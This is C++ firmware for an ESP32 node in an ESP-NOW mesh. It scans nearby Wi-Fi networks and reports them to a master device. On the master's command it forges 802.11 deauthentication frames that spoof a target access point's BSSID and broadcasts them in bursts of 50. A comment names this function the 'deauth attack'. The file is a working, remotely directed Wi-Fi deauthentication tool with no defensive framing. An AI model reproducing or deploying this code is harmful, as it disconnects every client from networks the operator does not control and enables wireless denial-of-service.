#include <esp_wifi.h>         // for esp_wifi_80211_tx()
#include <esp_now.h>
#include <WiFi.h>
#include <ArduinoJson.h>

// Configuration constants
#define MESH_CHANNEL 1
#define JSON_BUFFER_SIZE 2048
#define HEARTBEAT_INTERVAL 5000
#define SCAN_TIMEOUT_MS 15000

// Message types for ESP-NOW communication
enum MessageType {
  MSG_SLAVE_REGISTER,
  MSG_SCAN_REQUEST,
  MSG_SCAN_RESPONSE,
  MSG_DEAUTH_REQUEST,
  MSG_DEAUTH_RESPONSE,
  MSG_STATUS_REQUEST,
  MSG_STATUS_RESPONSE,
  MSG_HEARTBEAT,
  MSG_STATISTICS,
  MSG_ERROR
};

// ESP-NOW message structure
struct ESPNowMessage {
  MessageType type;
  uint8_t slaveMac[6];
  uint32_t messageId;
  uint32_t timestamp;
  char payload[180];
};

// Global variables
uint8_t masterMac[6] = {0}; // Will be set when we receive first message from master
uint32_t messageCounter = 0;
unsigned long lastHeartbeatSent = 0;
bool masterFound = false;
bool scanInProgress = false;
unsigned long scanStartTime = 0;

// Store the deauth packet template
uint8_t deauthPacket[26] = {
  0xC0, 0x00,             // Frame Control: deauth
  0x00, 0x00,             // Duration
  // addr1 (will fill with broadcast), addr2 & addr3 (BSSID) below
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,    // Addr1 (DA = broadcast)
  /* SA and BSSID get filled at runtime */
  0,0,0,0,0,0,
  0,0,0,0,0,0,
  0x00, 0x00              // Reason code
};

// Utility functions
String macToString(const uint8_t* mac) {
  char buffer[18];
  sprintf(buffer, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buffer);
}

void stringToMac(const String& macStr, uint8_t* mac) {
  uint32_t mac_part[6];
  sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
         &mac_part[0], &mac_part[1], &mac_part[2], &mac_part[3], &mac_part[4], &mac_part[5]);
  for(int i=0; i<6; ++i) {
    mac[i] = (uint8_t)mac_part[i];
  }
}

// ESP-NOW callback for data sent
void onESPNowDataSent(const uint8_t *mac_addr, esp_now_send_status_t status) {
  // Optional: handle send status
}

// ESP-NOW callback for data received
void onESPNowDataReceived(const uint8_t *mac, const uint8_t *incomingData, int len) {
  if (len != sizeof(ESPNowMessage)) {
    return;
  }

  ESPNowMessage message;
  memcpy(&message, incomingData, sizeof(message));

  // Store master MAC if not already known
  if (!masterFound) {
    memcpy(masterMac, mac, 6);
    masterFound = true;
    
    // Add master as ESP-NOW peer
    esp_now_peer_info_t peerInfo;
    memcpy(peerInfo.peer_addr, masterMac, 6);
    peerInfo.channel = MESH_CHANNEL;
    peerInfo.encrypt = false;
    esp_now_add_peer(&peerInfo);
    
    // Send registration message
    sendRegistration();
  }

  // Handle message based on type
  switch (message.type) {
    case MSG_SCAN_REQUEST:
      handleScanRequest(message);
      break;
    case MSG_DEAUTH_REQUEST:
      handleDeauthRequest(message);
      break;
    case MSG_HEARTBEAT:
      handleHeartbeat(message);
      break;
    default:
      break;
  }
}

// Send message to master
void sendMessageToMaster(MessageType type, const String& payload = "") {
  if (!masterFound) return;

  ESPNowMessage message;
  message.type = type;
  WiFi.macAddress(message.slaveMac);
  message.messageId = messageCounter++;
  message.timestamp = millis();
  
  strncpy(message.payload, payload.c_str(), sizeof(message.payload) - 1);
  message.payload[sizeof(message.payload) - 1] = '\0';
  
  esp_now_send(masterMac, (uint8_t*)&message, sizeof(message));
}

// Send registration message to master
void sendRegistration() {
  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  doc["supports5GHz"] = true;
  doc["supportsBLE"] = false;
  doc["deviceType"] = "ESP32-C5";
  doc["firmwareVersion"] = "1.0.0";
  doc["batteryLevel"] = 100;
  doc["freeHeap"] = ESP.getFreeHeap();
  doc["temperature"] = 25.0;

  String payload;
  serializeJson(doc, payload);
  
  sendMessageToMaster(MSG_SLAVE_REGISTER, payload);
}

// Handle scan request from master
void handleScanRequest(const ESPNowMessage& message) {
  if (scanInProgress) return;

  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  DeserializationError error = deserializeJson(doc, message.payload);
  if (error) return;

  bool both_bands = doc["both_bands"];
  bool include_hidden = doc["include_hidden"];
  
  scanInProgress = true;
  scanStartTime = millis();
  
  // Start WiFi scan
  WiFi.scanNetworks(true, include_hidden);
}

// Check scan progress and send results
void checkScanProgress() {
  if (!scanInProgress) return;

  int scanResult = WiFi.scanComplete();
  if (scanResult >= 0) {
    // Scan complete, send results
    DynamicJsonDocument doc(JSON_BUFFER_SIZE);
    JsonArray networks = doc.createNestedArray("networks");

    for (int i = 0; i < scanResult; i++) {
      JsonObject network = networks.createNestedObject();
      network["ssid"] = WiFi.SSID(i);
      network["bssid"] = WiFi.BSSIDstr(i);
      network["rssi"] = WiFi.RSSI(i);
      network["channel"] = WiFi.channel(i);
      network["hidden"] = (WiFi.SSID(i).length() == 0);
      network["is5GHz"] = (WiFi.channel(i) > 14);
      network["encryption"] = WiFi.encryptionType(i);
      network["beaconInterval"] = 0;
      network["vendor"] = "Unknown";
    }

    String payload;
    serializeJson(doc, payload);
    
    sendMessageToMaster(MSG_SCAN_RESPONSE, payload);
    
    WiFi.scanDelete();
    scanInProgress = false;
  } else if (millis() - scanStartTime > SCAN_TIMEOUT_MS) {
    // Scan timeout
    scanInProgress = false;
    WiFi.scanDelete();
  }
}

// Handle deauth request from master
void handleDeauthRequest(const ESPNowMessage& message) {
  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  DeserializationError error = deserializeJson(doc, message.payload);
  if (error) return;

  String bssidStr = doc["bssid"];
  uint8_t channel = doc["channel"];
  uint32_t duration = doc["duration"];
  
  uint8_t bssid[6];
  stringToMac(bssidStr, bssid);
  
  // Perform deauth
  bool success = sendDeauth(bssid, channel);
  
  // Send response
  DynamicJsonDocument responseDoc(JSON_BUFFER_SIZE);
  responseDoc["bssid"] = bssidStr;
  responseDoc["success"] = success;
  responseDoc["packets"] = 50; // Number of packets sent
  
  String responsePayload;
  serializeJson(responseDoc, responsePayload);
  
  sendMessageToMaster(MSG_DEAUTH_RESPONSE, responsePayload);
}

// Handle heartbeat from master
void handleHeartbeat(const ESPNowMessage& message) {
  // Send heartbeat response
  sendHeartbeat();
}

// Send heartbeat to master
void sendHeartbeat() {
  if (!masterFound) return;
  
  if (millis() - lastHeartbeatSent > HEARTBEAT_INTERVAL) {
    DynamicJsonDocument doc(JSON_BUFFER_SIZE);
    doc["rssi"] = WiFi.RSSI();
    doc["batteryLevel"] = 100;
    doc["freeHeap"] = ESP.getFreeHeap();
    doc["uptime"] = millis();
    doc["packetsProcessed"] = messageCounter;
    doc["temperature"] = 25.0;

    String payload;
    serializeJson(doc, payload);
    
    sendMessageToMaster(MSG_HEARTBEAT, payload);
    lastHeartbeatSent = millis();
  }
}

// Perform deauth attack
bool sendDeauth(const uint8_t *bssid, uint8_t channel) {
  // Save current channel
  uint8_t currentChannel;
  wifi_second_chan_t secondChan;
  esp_wifi_get_channel(&currentChannel, &secondChan);
  
  // Set Wi-Fi to target channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(10);

  // Fill in SA & BSSID in the packet
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);

  // Transmit a burst of deauth frames
  bool success = true;
  for(int i=0; i<50; i++) {
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
    if (result != ESP_OK) {
      success = false;
    }
    delay(2);
  }

  // Restore original channel
  esp_wifi_set_channel(currentChannel, secondChan);
  
  return success;
}

void setup() {
  Serial.begin(115200);
  
  // Initialize WiFi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_channel(MESH_CHANNEL, WIFI_SECOND_CHAN_NONE);

  // Initialize ESP-NOW
  if (esp_now_init() != ESP_OK) {
    Serial.println("ESP-NOW init failed");
    return;
  }

  // Register callbacks
  esp_now_register_send_cb(onESPNowDataSent);
  esp_now_register_recv_cb(onESPNowDataReceived);

  Serial.println("ESP-NOW Slave initialized");
}

void loop() {
  // Check scan progress
  checkScanProgress();
  
  // Send periodic heartbeat
  sendHeartbeat();
  
  delay(10);
}
